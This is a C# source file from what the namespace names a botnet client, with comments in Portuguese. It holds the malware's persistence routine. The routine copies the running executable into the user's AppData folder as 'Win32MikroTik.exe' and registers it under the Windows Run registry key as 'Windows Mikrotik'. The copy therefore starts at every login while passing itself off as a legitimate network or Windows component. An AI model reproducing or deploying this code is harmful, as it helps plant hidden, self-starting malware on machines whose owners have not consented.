using Microsoft.Win32;
using System;
using System.IO;

namespace botNetClient
{
    public class StartUp
    {
        /*
         * Checa se o arquivo esta na pasta %appdata%
         * Check no regedit
         * */

        private static string pwd = Environment.GetCommandLineArgs()[0];
        private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ "\\Mikrotik\\";

        public static void checkFile()
        {
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            if (!File.Exists(path+ "Win32MikroTik.exe") )
            {
                File.Copy(pwd, path + "Win32MikroTik.exe");
                Console.WriteLine("Win32MikroTik nao existe");
            }
            else
                Console.WriteLine("Win32MikroTik Existe");

        }

        public static void Regedit()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp.GetValue("Windows Mikrotik") == null)
            {
                rkApp.SetValue("Windows Mikrotik", path + "Win32MikroTik.exe");
            }

            
        }
    }
}
